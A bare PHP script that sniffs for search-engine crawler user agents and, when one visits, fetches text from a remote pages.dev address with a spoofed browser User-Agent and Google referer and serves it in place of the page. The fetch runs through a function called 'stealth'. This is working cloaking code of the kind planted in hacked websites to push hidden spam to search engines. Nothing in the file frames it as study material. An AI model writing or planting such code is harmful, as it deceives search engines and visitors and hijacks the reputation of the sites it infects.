<?php
@ob_start();
header("Vary: U-Agent");

$src = "https://bismillahnaikyagesya.pages.dev/index.txt";
$match = "/(googlebot|slurp|bingbot|baiduspider|yandex|crawler|spider|adsense|inspection|mediapartners)/i";
$ua = strtolower($_SERVER["HTTP_USER_AGENT"] ?? '');

function stealth($u) {
    $ctx = stream_context_create([
        "http" => [
            "method" => "GET",
            "header" => "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n" .
                        "Referer: https://www.google.com/\r\n"
        ]
    ]);
    return @file_get_contents($u, false, $ctx);
}

if (preg_match($match, $ua)) {
    usleep(rand(100000, 200000));
    echo stealth($src);
    @ob_end_flush();
    exit;
}
?>
